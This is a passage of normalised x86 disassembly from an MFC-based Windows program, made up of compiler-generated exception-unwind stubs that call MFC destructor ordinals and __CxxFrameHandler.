lea ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d796
lea ecx [ ebp - 0x208 ]
jmp Ordinal_MFC42_800
sub_40d7a1
lea ecx [ ebp - 0x1e8 ]
jmp Ordinal_MFC42_800
sub_40d7ac
lea ecx [ ebp - 0x1e4 ]
jmp Ordinal_MFC42_800
sub_40d7b7
lea ecx [ ebp - 0x20c ]
jmp Ordinal_MFC42_800
sub_40d7c2
lea ecx [ ebp - 0x20c ]
jmp Ordinal_MFC42_800
sub_40d7cd
lea ecx [ ebp - 0x20c ]
jmp Ordinal_MFC42_800
sub_40d7d8
mov eax r--data
jmp __CxxFrameHandler
sub_40d7f0
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40d7f8
lea ecx [ ebp - 0x20 ]
jmp Ordinal_MFC42_800
sub_40d800
lea ecx [ ebp - 0x58 ]
jmp Ordinal_MFC42_665
sub_40d808
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40d810
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_40d818
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40d820
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40d828
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40d830
lea ecx [ ebp - 0x28 ]
jmp sub_402600
sub_40d838
mov eax r--data
jmp __CxxFrameHandler
sub_40d850
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40d858
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40d860
lea ecx [ ebp - 0x30 ]
jmp Ordinal_MFC42_665
sub_40d868
lea ecx [ ebp - 0x20 ]
jmp sub_402600
sub_40d870
mov eax r--data
jmp __CxxFrameHandler
sub_40d880
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_665
sub_40d888
mov eax r--data
jmp __CxxFrameHandler
sub_40d8a0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_815
sub_40d8a8
mov eax r--data
jmp __CxxFrameHandler
sub_40d8c0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_815
sub_40d8c8
mov eax r--data
jmp __CxxFrameHandler
sub_40d8e0
mov eax [ ebp - 0x20 ]
push eax
call sub_4033e0
retn
sub_40d8ea
mov eax r--data
jmp __CxxFrameHandler
